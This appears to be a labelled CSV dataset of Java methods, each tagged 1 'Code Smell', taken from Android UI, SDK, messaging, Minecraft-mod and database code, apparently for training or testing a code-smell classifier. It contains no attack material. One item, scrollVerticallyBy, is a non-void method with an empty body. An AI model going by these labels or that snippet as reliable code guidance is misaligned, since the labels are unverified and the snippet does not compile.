text,label,text_label
"private boolean getTopicCtrlJsonSetInfo(HttpServletRequest req,boolean isAddOp,BaseEntity defOpEntity,StringBuilder sBuffer,ProcessResult result){
  if (!WebParameterUtils.getJsonArrayParamValue(req,WebFieldDef.TOPICCTRLSET,true,null,result)) {
    return result.isSuccess();
  }
  List<Map<String,String>> ctrlJsonArray=(List<Map<String,String>>)result.getRetData();
  ClusterSettingEntity defClusterSetting=defMetaDataService.getClusterDefSetting(false);
  int defMaxMsgSizeMB=defClusterSetting.getMaxMsgSizeInMB();
  TopicCtrlEntity itemConf;
  Map<String,TopicCtrlEntity> addRecordMap=new HashMap<>();
  for (  Map<String,String> itemConfMap : ctrlJsonArray) {
    if (!WebParameterUtils.getAUDBaseInfo(itemConfMap,isAddOp,defOpEntity,sBuffer,result)) {
      return result.isSuccess();
    }
    final BaseEntity itemOpEntity=(BaseEntity)result.getRetData();
    if (!WebParameterUtils.getStringParamValue(itemConfMap,WebFieldDef.TOPICNAME,true,"""",sBuffer,result)) {
      return result.isSuccess();
    }
    final String topicName=(String)result.getRetData();
    if (!WebParameterUtils.getIntParamValue(itemConfMap,WebFieldDef.MAXMSGSIZEINMB,false,(isAddOp ? defMaxMsgSizeMB : TBaseConstants.META_VALUE_UNDEFINED),TBaseConstants.META_MIN_ALLOWED_MESSAGE_SIZE_MB,TBaseConstants.META_MAX_ALLOWED_MESSAGE_SIZE_MB,sBuffer,result)) {
      return result.isSuccess();
    }
    final int itemMaxMsgSizeMB=(int)result.getRetData();
    if (!WebParameterUtils.getIntParamValue(itemConfMap,WebFieldDef.TOPICNAMEID,false,(isAddOp ? TServerConstants.TOPIC_ID_MIN : TBaseConstants.META_VALUE_UNDEFINED),TServerConstants.TOPIC_ID_MIN,sBuffer,result)) {
      return result.isSuccess();
    }
    int itemTopicNameId=(int)result.getRetData();
    if (!WebParameterUtils.getEnableStatusValue(itemConfMap,WebFieldDef.AUTHCTRLENABLE,false,(isAddOp ? EnableStatus.STATUS_DISABLE : null),sBuffer,result)) {
      return result.isSuccess();
    }
    EnableStatus enableTopicAuth=(EnableStatus)result.getRetData();
    itemConf=new TopicCtrlEntity(itemOpEntity,topicName);
    itemConf.updModifyInfo(itemOpEntity.getDataVerId(),itemTopicNameId,itemMaxMsgSizeMB,enableTopicAuth);
    addRecordMap.put(itemConf.getTopicName(),itemConf);
  }
  if (addRecordMap.isEmpty()) {
    result.setFailResult(sBuffer.append(""Not found record info in "").append(WebFieldDef.TOPICCTRLSET.name).append("" parameter!"").toString());
    sBuffer.delete(0,sBuffer.length());
    return result.isSuccess();
  }
  result.setSuccResult(addRecordMap);
  return result.isSuccess();
}",1,Code Smell
"@Override protected void drawPickerChart(Canvas canvas){
  int bottom=getMeasuredHeight() - PICKER_PADDING;
  int top=getMeasuredHeight() - pikerHeight - PICKER_PADDING;
  int nl=lines.size();
  if (chartData != null) {
    for (int k=0; k < nl; k++) {
      LineViewData line=lines.get(k);
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePath.reset();
      int n=chartData.xPercentage.length;
      int j=0;
      int[] y=line.line.y;
      line.chartPath.reset();
      for (int i=0; i < n; i++) {
        if (y[i] < 0)         continue;
        float xPoint=chartData.xPercentage[i] * pickerWidth;
        float h=ANIMATE_PICKER_SIZES ? pickerMaxHeight : chartData.maxValue;
        float hMin=ANIMATE_PICKER_SIZES ? pickerMinHeight : chartData.minValue;
        float yPercentage=(y[i] - hMin) / (h - hMin);
        float yPoint=(1f - yPercentage) * pikerHeight;
        if (USE_LINES) {
          if (j == 0) {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
 else {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
        }
 else {
          if (i == 0) {
            line.bottomLinePath.moveTo(xPoint,yPoint);
          }
 else {
            line.bottomLinePath.lineTo(xPoint,yPoint);
          }
        }
      }
      line.linesPathBottomSize=j;
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePaint.setAlpha((int)(255 * line.alpha));
      if (USE_LINES)       canvas.drawLines(line.linesPathBottom,0,line.linesPathBottomSize,line.bottomLinePaint);
 else       canvas.drawPath(line.bottomLinePath,line.bottomLinePaint);
    }
  }
}",1,Code Smell
"public Map<String,Object> doRequest(String action,String protocol,String method,String version,Map<String,Object> query,Map<String,Object> body,RuntimeOptions runtime) throws Exception {
  Map<String,Object> runtime_=TeaConverter.buildMap(new TeaPair(""readTimeout"",runtime.readTimeout),new TeaPair(""connectTimeout"",runtime.connectTimeout),new TeaPair(""retry"",TeaConverter.buildMap(new TeaPair(""maxAttempts"",runtime.maxAttempts))),new TeaPair(""backoff"",TeaConverter.buildMap(new TeaPair(""policy"",runtime.backoffPolicy),new TeaPair(""period"",runtime.backoffPeriod))),new TeaPair(""ignoreSSL"",runtime.ignoreSSL));
  TeaRequest _lastRequest=null;
  long _now=System.currentTimeMillis();
  int _retryTimes=0;
  while (Tea.allowRetry((java.util.Map<String,Object>)runtime_.get(""retry""),_retryTimes,_now)) {
    if (_retryTimes > 0) {
      int backoffTime=Tea.getBackoffTime(runtime_.get(""backoff""),_retryTimes);
      if (backoffTime > 0) {
        Tea.sleep(backoffTime);
      }
    }
    _retryTimes=_retryTimes + 1;
    try {
      TeaRequest request_=new TeaRequest();
      request_.protocol=protocol;
      request_.method=method;
      request_.pathname=""/"";
      request_.query=TeaConverter.merge(String.class,TeaConverter.buildMap(new TeaPair(""Action"",action),new TeaPair(""Format"",this.format),new TeaPair(""Timestamp"",getTimestamp()),new TeaPair(""Version"",version),new TeaPair(""SignatureNonce"",getNonce())),query);
      request_.headers=TeaConverter.buildMap(new TeaPair(""host"",this.endpoint));
      if (!isUnset(body)) {
        java.util.Map<String,Object> tmp=anyifyMapValue(body);
        request_.body=Tea.toReadable(toFormString(tmp));
        request_.headers.put(""content-type"",""application/x-www-form-urlencoded"");
      }
      ICredentials credentials=this.credentialsProvider.getCredentials();
      if (credentials == null) {
        throw new TeaRetryableException();
      }
      request_.query.put(""SignatureMethod"",this.signatureMethod);
      request_.query.put(""SignatureVersion"",this.signatureVersion);
      request_.query.put(""AccessKeyId"",credentials.getAccessKeyId());
      if (!StringUtils.isEmpty(credentials.getSecurityToken())) {
        request_.query.put(""SecurityToken"",credentials.getSecurityToken());
      }
      java.util.Map<String,String> signedParam=TeaConverter.merge(String.class,request_.query,body);
      request_.query.put(""Signature"",getSignature(signedParam,request_.method,credentials.getAccessKeySecret()));
      _lastRequest=request_;
      TeaResponse response_=Tea.doAction(request_,runtime_);
      Object obj=readAsJSON(response_.body);
      java.util.Map<String,Object> res=assertAsMap(obj);
      if (is4xx(response_.statusCode) || is5xx(response_.statusCode)) {
        throw new TeaException(TeaConverter.buildMap(new TeaPair(""message"",res.get(""Message"")),new TeaPair(""data"",res),new TeaPair(""code"",res.get(""Code""))));
      }
      return res;
    }
 catch (    Exception e) {
      if (Tea.isRetryable(e)) {
        continue;
      }
      throw e;
    }
  }
  throw new TeaUnretryableException(_lastRequest);
}",1,Code Smell
"@Override public void processActivityAction(@NonNull Activity activity,@NonNull String data,@NonNull ResultData result){
  Bundle bundle=activity.getIntent().getExtras();
  if (bundle == null) {
    result.addResultItem(CodeLocatorConstants.ResultKey.ERROR,CodeLocatorConstants.Error.BUNDLE_IS_NULL);
    return;
  }
  Set<String> keySet=bundle.keySet();
  if (keySet.isEmpty()) {
    result.addResultItem(CodeLocatorConstants.ResultKey.ERROR,CodeLocatorConstants.Error.BUNDLE_IS_NULL);
    return;
  }
  HashMap<String,String> map=new HashMap<>();
  for (  String key : keySet) {
    if (CodeLocatorConstants.ACTIVITY_START_STACK_INFO.equals(key)) {
      continue;
    }
    final Object value=bundle.get(key);
    if (value instanceof Byte) {
      map.put(key,""Byte   : "" + value);
    }
 else     if (value instanceof Character) {
      map.put(key,""Char   : "" + value);
    }
 else     if (value instanceof Integer) {
      map.put(key,""Int    : "" + value);
    }
 else     if (value instanceof Short) {
      map.put(key,""Short  : "" + value);
    }
 else     if (value instanceof Long) {
      map.put(key,""Long   : "" + value);
    }
 else     if (value instanceof Float) {
      map.put(key,""Float  : "" + value);
    }
 else     if (value instanceof Double) {
      map.put(key,""Double : "" + value);
    }
 else     if (value instanceof Boolean) {
      map.put(key,""Boolean: "" + value);
    }
 else     if (value instanceof String) {
      map.put(key,""String : "" + value);
    }
 else     if (value instanceof Serializable) {
      try {
        map.put(key,GsonUtils.sGson.toJson(value));
      }
 catch (      Throwable t) {
        map.put(key,value.toString());
        Log.d(CodeLocator.TAG,""put value error "" + Log.getStackTraceString(t));
      }
    }
 else     if (value instanceof Parcelable) {
      try {
        map.put(key,GsonUtils.sGson.toJson(value));
      }
 catch (      Throwable t) {
        map.put(key,value.toString());
        Log.d(CodeLocator.TAG,""put value error "" + Log.getStackTraceString(t));
      }
    }
 else {
      if (value == null) {
        map.put(key,""null"");
      }
 else {
        map.put(key,value.toString());
      }
    }
  }
  try {
    result.addResultItem(CodeLocatorConstants.ResultKey.DATA,GsonUtils.sGson.toJson(map));
  }
 catch (  Throwable t) {
    result.addResultItem(CodeLocatorConstants.ResultKey.ERROR,CodeLocatorConstants.Error.ERROR_WITH_STACK_TRACE);
    result.addResultItem(CodeLocatorConstants.ResultKey.STACK_TRACE,Log.getStackTraceString(t));
    Log.d(CodeLocator.TAG,""put value error "" + Log.getStackTraceString(t));
  }
}
",1,Code Smell
"public void fillDialogsEntitiesRecursive(final File fromFolder,int type,LongSparseArray<DialogFileEntities> dilogsFilesEntities,CacheModel cacheModel){
  if (fromFolder == null) {
    return;
  }
  File[] files=fromFolder.listFiles();
  if (files == null) {
    return;
  }
  for (  final File fileEntry : files) {
    if (canceled) {
      return;
    }
    if (fileEntry.isDirectory()) {
      fillDialogsEntitiesRecursive(fileEntry,type,dilogsFilesEntities,cacheModel);
    }
 else {
      if (fileEntry.getName().equals("".nomedia"")) {
        continue;
      }
      FilePathDatabase.FileMeta fileMetadata=getFileLoader().getFileDatabase().getFileDialogId(fileEntry,null);
      int addToType=type;
      String fileName=fileEntry.getName().toLowerCase();
      if (fileName.endsWith("".mp3"") || fileName.endsWith("".m4a"")) {
        addToType=TYPE_MUSIC;
      }
      CacheModel.FileInfo fileInfo=new CacheModel.FileInfo(fileEntry);
      fileInfo.type=addToType;
      if (fileMetadata != null) {
        fileInfo.dialogId=fileMetadata.dialogId;
        fileInfo.messageId=fileMetadata.messageId;
        fileInfo.messageType=fileMetadata.messageType;
      }
      fileInfo.size=fileEntry.length();
      if (fileInfo.dialogId != 0) {
        DialogFileEntities dilogEntites=dilogsFilesEntities.get(fileInfo.dialogId,null);
        if (dilogEntites == null) {
          dilogEntites=new DialogFileEntities(fileInfo.dialogId);
          dilogsFilesEntities.put(fileInfo.dialogId,dilogEntites);
        }
        dilogEntites.addFile(fileInfo,addToType);
      }
      if (cacheModel != null) {
        cacheModel.add(addToType,fileInfo);
      }
    }
  }
}",1,Code Smell
"public static void analysisAndAppendInfoToMap(int onClickListenerMemAddr,StackTraceElement[] stackTraceElements,int tag,String type){
  if (stackTraceElements == null || onClickListenerMemAddr == 0) {
    return;
  }
  final CodeLocatorConfig config=CodeLocator.sGlobalConfig;
  try {
    StackTraceElement findElement=null;
    for (int i=config.getSkipSystemTraceCount(); i < stackTraceElements.length && i < config.getViewMaxLoopCount(); i++) {
      final StackTraceElement stackTraceElement=stackTraceElements[i];
      final String currentClassName=stackTraceElement.getClassName();
      final String currentMethodName=stackTraceElement.getMethodName();
      if (currentClassName == null) {
        continue;
      }
 else       if (config.getViewReturnByClazzs().contains(currentClassName) || (stackTraceElement.getFileName() != null && stackTraceElement.getFileName().contains(""_ViewBinding""))) {
        return;
      }
 else {
        boolean containsKeyword=false;
        for (        String keyword : config.getViewIgnoreByKeyWords()) {
          if (currentClassName.contains(keyword) || (currentMethodName != null && currentMethodName.contains(keyword))) {
            containsKeyword=true;
            break;
          }
        }
        if (containsKeyword) {
          continue;
        }
      }
      findElement=stackTraceElement;
      break;
    }
    if (findElement == null) {
      return;
    }
    CodeLocator.getOnClickInfoMap().put(onClickListenerMemAddr,findElement.getFileName() + "":"" + findElement.getLineNumber());
  }
 catch (  Throwable t) {
    Log.e(CodeLocator.TAG,""analysisAndAppendInfoToMap Error "" + Log.getStackTraceString(t));
  }
}",1,Code Smell
"@Override @Nullable public Hcl visit(@Nullable Tree tree,P p,Cursor parent){
  setCursor(parent);
  for (Cursor c=parent; c != null; c=c.getParent()) {
    Object v=c.getValue();
    Space space=null;
    if (v instanceof Hcl) {
      space=((Hcl)v).getPrefix();
    }
 else     if (v instanceof HclRightPadded) {
      space=((HclRightPadded<?>)v).getAfter();
    }
 else     if (v instanceof HclLeftPadded) {
      space=((HclLeftPadded<?>)v).getBefore();
    }
 else     if (v instanceof HclContainer) {
      space=((HclContainer<?>)v).getBefore();
    }
    if (space != null && space.getLastWhitespace().contains(""\n"")) {
      int indent=findIndent(space);
      if (indent != 0) {
        c.putMessage(""lastIndent"",indent);
      }
    }
  }
  Iterator<Object> path=parent.getPath(Hcl.class::isInstance);
  if (path.hasNext()) {
    preVisit((Hcl)path.next(),p);
  }
  return visit(tree,p);
}
@Nullable @Override public Hcl visit(@Nullable Tree tree,P p){
  if (getCursor().getNearestMessage(""stop"") != null) {
    return (Hcl)tree;
  }
  return super.visit(tree,p);
}",1,Code Smell
"private static boolean checkConditionWithLauncherVersion(int launcherversion,String handledcondition){
  boolean result=true;
  for (int a=0; a < handledcondition.length(); a++) {
    if (handledcondition.charAt(a) == '<') {
      ArrayList<String> nums=new ArrayList<>();
      for (int b=a + 1; b < handledcondition.length(); b++) {
        if (handledcondition.charAt(b) != ' ') {
          nums.add(String.valueOf(handledcondition.charAt(b)));
        }
      }
      StringBuilder numstr=new StringBuilder();
      for (      String str : nums) {
        numstr.append(str);
      }
      int num=Integer.parseInt(numstr.toString());
      if (launcherversion >= num) {
        result=false;
      }
    }
    if (handledcondition.charAt(a) == '>') {
      ArrayList<String> nums=new ArrayList<>();
      for (int b=a + 1; b < handledcondition.length(); b++) {
        if (handledcondition.charAt(b) != ' ') {
          nums.add(String.valueOf(handledcondition.charAt(b)));
        }
      }
      StringBuilder numstr=new StringBuilder();
      for (      String str : nums) {
        numstr.append(str);
      }
      int num=Integer.parseInt(numstr.toString());
      if (launcherversion <= num) {
        result=false;
      }
    }
  }
  return result;
}",1,Code Smell
"@Override public int scrollVerticallyBy(int dy,RecyclerView.Recycler recycler,RecyclerView.State state){
}
",1,Code Smell
"public static boolean checkUrlMatch(String apiDefinitionPath,String requestUrlSuffix){
  if (StringUtils.equalsAny(apiDefinitionPath,requestUrlSuffix,""/"" + requestUrlSuffix)) {
    return true;
  }
 else {
    if (StringUtils.isNotEmpty(apiDefinitionPath)) {
      String urlSuffix=requestUrlSuffix;
      if (urlSuffix.startsWith(""/"")) {
        urlSuffix=urlSuffix.substring(1);
      }
      if (apiDefinitionPath.startsWith(""/"")) {
        apiDefinitionPath=apiDefinitionPath.substring(1);
      }
      boolean urlSuffixEndEmpty=false;
      if (urlSuffix.endsWith(""/"")) {
        urlSuffixEndEmpty=true;
        urlSuffix=urlSuffix + ""emptyStrForSplit"";
      }
      String[] requestUrlDomainArr=urlSuffix.split(""/"");
      if (urlSuffixEndEmpty) {
        requestUrlDomainArr[requestUrlDomainArr.length - 1]=StringUtils.EMPTY;
      }
      urlSuffixEndEmpty=false;
      if (apiDefinitionPath.endsWith(""/"")) {
        urlSuffixEndEmpty=true;
        apiDefinitionPath=apiDefinitionPath + ""emptyStrForSplit"";
      }
      String[] apiPathDomainArr=apiDefinitionPath.split(""/"");
      if (urlSuffixEndEmpty) {
        apiPathDomainArr[apiPathDomainArr.length - 1]=StringUtils.EMPTY;
      }
      if (apiPathDomainArr.length == requestUrlDomainArr.length) {
        boolean isFetch=true;
        for (int i=0; i < requestUrlDomainArr.length; i++) {
          String pathItem=apiPathDomainArr[i];
          if (!(pathItem.startsWith(""{"") && pathItem.endsWith(""}""))) {
            if (!StringUtils.equals(apiPathDomainArr[i],requestUrlDomainArr[i])) {
              return false;
            }
          }
        }
        return isFetch;
      }
    }
  }
  return false;
}",1,Code Smell
"private static TLRPC.PhotoSize findPhotoCachedSize(TLRPC.Message message){
  TLRPC.PhotoSize photoSize=null;
  if (message.media instanceof TLRPC.TL_messageMediaPhoto) {
    for (int a=0, count=message.media.photo.sizes.size(); a < count; a++) {
      TLRPC.PhotoSize size=message.media.photo.sizes.get(a);
      if (size instanceof TLRPC.TL_photoCachedSize) {
        photoSize=size;
        break;
      }
    }
  }
 else   if (message.media instanceof TLRPC.TL_messageMediaDocument) {
    for (int a=0, count=message.media.document.thumbs.size(); a < count; a++) {
      TLRPC.PhotoSize size=message.media.document.thumbs.get(a);
      if (size instanceof TLRPC.TL_photoCachedSize) {
        photoSize=size;
        break;
      }
    }
  }
 else   if (message.media instanceof TLRPC.TL_messageMediaWebPage) {
    if (message.media.webpage.photo != null) {
      for (int a=0, count=message.media.webpage.photo.sizes.size(); a < count; a++) {
        TLRPC.PhotoSize size=message.media.webpage.photo.sizes.get(a);
        if (size instanceof TLRPC.TL_photoCachedSize) {
          photoSize=size;
          break;
        }
      }
    }
  }
 else   if (message.media instanceof TLRPC.TL_messageMediaInvoice && message.media.extended_media instanceof TLRPC.TL_messageExtendedMediaPreview) {
    photoSize=((TLRPC.TL_messageExtendedMediaPreview)message.media.extended_media).thumb;
  }
  return photoSize;
}",1,Code Smell
"private static void mergeGroup(List<DiscountGroup> groups,Map<String,Map<String,DiscountWrapper>> inMap,AtomicLongMap<String> ctx,Map<String,Integer> idxMap,List<List<Item>> resultList){
  if (CollectionUtils.isEmpty(groups)) {
    return;
  }
  List<Item> xList=groups.get(0).filterItems(inMap);
  if (CollectionUtils.isEmpty(xList)) {
    return;
  }
  if (groups.size() == 1) {
    String key=uniqueKey(xList);
    ctx.incrementAndGet(key);
    idxMap.put(key,resultList.size());
    resultList.add(xList);
  }
 else {
    List<Item> yList=groups.get(1).filterItems(inMap);
    if (Objects.equals(EXCLUDE,groups.get(0).getRelation())) {
      for (      Item item : xList) {
        for (        Item item1 : yList) {
          resultList.add(Lists.newArrayList(item,item1));
        }
      }
    }
 else {
      String k=uniqueKey(xList);
      for (      Item item : yList) {
        ctx.incrementAndGet(k);
        List<Item> xCopy=Lists.newArrayList(xList);
        xCopy.add(item);
        resultList.add(xCopy);
      }
    }
  }
}",1,Code Smell
"@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  int width=MeasureSpec.getSize(widthMeasureSpec);
  int height=MeasureSpec.getSize(heightMeasureSpec);
  int heightSpec=MeasureSpec.makeMeasureSpec(height,MeasureSpec.EXACTLY);
  int visibleCount=getVisibleButtons(mTempTargets);
  if (visibleCount == 1) {
    int widthSpec=MeasureSpec.makeMeasureSpec(width,MeasureSpec.AT_MOST);
    ButtonDropTarget firstButton=mTempTargets[0];
    firstButton.setTextSize(TypedValue.COMPLEX_UNIT_PX,mLauncher.getDeviceProfile().dropTargetTextSizePx);
    firstButton.setTextVisible(true);
    firstButton.setIconVisible(true);
    firstButton.measure(widthSpec,heightSpec);
    firstButton.resizeTextToFit();
  }
 else   if (visibleCount == 2) {
    DeviceProfile dp=mLauncher.getDeviceProfile();
    int verticalPadding=dp.dropTargetVerticalPaddingPx;
    int horizontalPadding=dp.dropTargetHorizontalPaddingPx;
    ButtonDropTarget firstButton=mTempTargets[0];
    firstButton.setTextSize(TypedValue.COMPLEX_UNIT_PX,dp.dropTargetTextSizePx);
    firstButton.setTextVisible(true);
    firstButton.setIconVisible(true);
    firstButton.setTextMultiLine(false);
    firstButton.setPadding(horizontalPadding,verticalPadding,horizontalPadding,verticalPadding);
    ButtonDropTarget secondButton=mTempTargets[1];
    secondButton.setTextSize(TypedValue.COMPLEX_UNIT_PX,dp.dropTargetTextSizePx);
    secondButton.setTextVisible(true);
    secondButton.setIconVisible(true);
    secondButton.setTextMultiLine(false);
    secondButton.setPadding(horizontalPadding,verticalPadding,horizontalPadding,verticalPadding);
    int availableWidth;
    if (dp.isTwoPanels) {
      availableWidth=(dp.availableWidthPx - dp.dropTargetGapPx) / 2;
    }
 else {
      availableWidth=dp.availableWidthPx - dp.dropTargetGapPx;
    }
    int widthSpec=MeasureSpec.makeMeasureSpec(availableWidth,MeasureSpec.AT_MOST);
    firstButton.measure(widthSpec,heightSpec);
    if (!mIsVertical) {
      if (firstButton.isTextTruncated(availableWidth)) {
        firstButton.setIconVisible(false);
        secondButton.setIconVisible(false);
        firstButton.setTextMultiLine(true);
        firstButton.setPadding(horizontalPadding,verticalPadding / 2,horizontalPadding,verticalPadding / 2);
      }
    }
    if (!dp.isTwoPanels) {
      availableWidth-=firstButton.getMeasuredWidth() + dp.dropTargetGapPx;
      widthSpec=MeasureSpec.makeMeasureSpec(availableWidth,MeasureSpec.AT_MOST);
    }
    secondButton.measure(widthSpec,heightSpec);
    if (!mIsVertical) {
      if (secondButton.isTextTruncated(availableWidth)) {
        secondButton.setIconVisible(false);
        firstButton.setIconVisible(false);
        secondButton.setTextMultiLine(true);
        secondButton.setPadding(horizontalPadding,verticalPadding / 2,horizontalPadding,verticalPadding / 2);
      }
    }
    float minTextSize=Math.min(firstButton.resizeTextToFit(),secondButton.resizeTextToFit());
    if (firstButton.getTextSize() != minTextSize || secondButton.getTextSize() != minTextSize) {
      firstButton.setTextSize(minTextSize);
      secondButton.setTextSize(minTextSize);
    }
  }
  setMeasuredDimension(width,height);
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite @Nullable public Entity changeDimension(ServerLevel arg){
  return this.changeDimension(arg,arg.getPortalForcer());
}
/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite(remap=false) @Nullable public Entity changeDimension(ServerLevel server,ITeleporter teleporter){
  if (!CommonHooks.onTravelToDimension((Entity)(Object)this,server.dimension()))   return null;
  if (this.level() instanceof ServerLevel && !this.isRemoved()) {
    this.level().getProfiler().push(""changeDimension"");
    if (server == null) {
      return null;
    }
    this.level().getProfiler().push(""reposition"");
    var bukkitPos=bridge$getLastTpPos();
    PortalInfo portalinfo=bukkitPos == null ? teleporter.getPortalInfo((Entity)(Object)this,server,this::findDimensionEntryPoint) : new PortalInfo(new Vec3(bukkitPos.x(),bukkitPos.y(),bukkitPos.z()),Vec3.ZERO,this.yRot,this.xRot);
    if (portalinfo == null) {
      return null;
    }
 else {
      ServerLevel world=((PortalInfoBridge)portalinfo).bridge$getWorld() == null ? server : ((PortalInfoBridge)portalinfo).bridge$getWorld();
      if (world == this.level()) {
        this.moveTo(portalinfo.pos.x,portalinfo.pos.y,portalinfo.pos.z,portalinfo.yRot,this.getXRot());
        this.setDeltaMovement(portalinfo.speed);
        return (Entity)(Object)this;
      }
      this.unRide();
      Entity transportedEntity=teleporter.placeEntity((Entity)(Object)this,(ServerLevel)this.level(),world,this.getYRot(),spawnPortal -> {
        this.level().getProfiler().popPush(""reloading"");
        Entity entity=this.getType().create(world);
        if (entity != null) {
          entity.restoreFrom((Entity)(Object)this);
          entity.moveTo(portalinfo.pos.x,portalinfo.pos.y,portalinfo.pos.z,portalinfo.yRot,entity.getXRot());
          entity.setDeltaMovement(portalinfo.speed);
          if (this.bridge$isInWorld()) {
            world.addDuringTeleport(entity);
            if (((WorldBridge)world).bridge$getTypeKey() == LevelStem.END) {
              ArclightCaptures.captureEndPortalEntity((Entity)(Object)this,spawnPortal);
              ServerLevel.makeObsidianPlatform(world);
            }
          }
        }
        return entity;
      }
);
      this.removeAfterChangingDimensions();
      this.level().getProfiler().pop();
      ((ServerLevel)this.level()).resetEmptyTime();
      world.resetEmptyTime();
      this.level().getProfiler().pop();
      return transportedEntity;
    }
  }
 else {
    return null;
  }
}",1,Code Smell
"@Override protected List<TableRangeInfo<K>> calculateRanges(String quoteTableWithSchema,K preMaxPriKey,K maxPriKey) throws IOException, InterruptedException {
  final ArrayList<TableRangeInfo<K>> singleTableRangeList=new ArrayList<>();
  K currentMaxPriKey=preMaxPriKey;
  DbShardWithConn oneShard;
  long currentSplitNum=0L;
  long st=System.currentTimeMillis();
  final double timeInterval=60.0;
  boolean statementRefresh=true;
  while (compareSplitKey(currentMaxPriKey,maxPriKey) < 0) {
    oneShard=pickOneShard();
    for (int i=0; i < RETRY_NUM; i++) {
      try {
        String cacheIndex=quoteTableWithSchema + ""_"" + preMaxPriKey.toString();
        Pair<K,K> range=cache.get(cacheIndex);
        if (range == null) {
          currentMaxPriKey=getOneSplitMaxPrimaryKey(oneShard,quoteTableWithSchema,preMaxPriKey,statementRefresh);
          statementRefresh=false;
          if (currentMaxPriKey.equals(maxPriKey)) {
            currentMaxPriKey=addDeltaToKey(maxPriKey);
          }
          if (compareSplitKey(currentMaxPriKey,preMaxPriKey) <= 0) {
            log.info(""Current max PK {} is not more than previous PK {}. Ignore this range and fetch next slave."",currentMaxPriKey,preMaxPriKey);
            continue;
          }
          range=new Pair<>(preMaxPriKey,currentMaxPriKey);
          cache.set(cacheIndex,range);
          if (currentSplitNum % FETCH_RANGE_SLEEP_SIZE == 0) {
            log.debug(""["" + Thread.currentThread().getName() + ""] Current split num: ""+ currentSplitNum+ "" Have a relax, sleep for 1s..."");
            Thread.sleep(FETCH_RANGE_SLEEP_INTERVAL);
            fetchRangeSleepTime++;
          }
        }
 else {
          currentMaxPriKey=range.getSecond();
          if (currentMaxPriKey.equals(maxPriKey)) {
            currentMaxPriKey=addDeltaToKey(maxPriKey);
          }
        }
        singleTableRangeList.add(new TableRangeInfo<>(quoteTableWithSchema,range));
        preMaxPriKey=currentMaxPriKey;
        currentSplitNum++;
        break;
      }
 catch (      SQLException e) {
        log.error(""Fetch primary key range failure, due to "" + e.getMessage() + "", sql: ""+ getFetchSQLFormat()+ "", last primary key: ""+ preMaxPriKey+ "", try num ""+ i+ ""\tInstance info: ""+ oneShard.getShardInfo(),e);
        if (i == RETRY_NUM - 1) {
          throw new IOException(""Fetch primary key range failure! DB instance info: "" + oneShard.getShardInfo(),e);
        }
        try {
          Thread.sleep(i * RETRY_BASE_TIME_DURATION);
          fetchRangeSleepTime++;
        }
 catch (        InterruptedException e1) {
          log.error(""Retry has been Interrupted..."",e);
          throw new IOException(""Fetch primary key range failure!"",e);
        }
        oneShard.reconnect();
      }
    }
    long currentTime=System.currentTimeMillis();
    getOneSplitMaxPrimaryKeyCount++;
    double time=TimeUnit.MILLISECONDS.toSeconds(currentTime - st);
    if (time >= timeInterval) {
      st=currentTime;
      logCurrentProcess(quoteTableWithSchema,maxPriKey,currentMaxPriKey,oneShard);
    }
  }
  return singleTableRangeList;
}",1,Code Smell
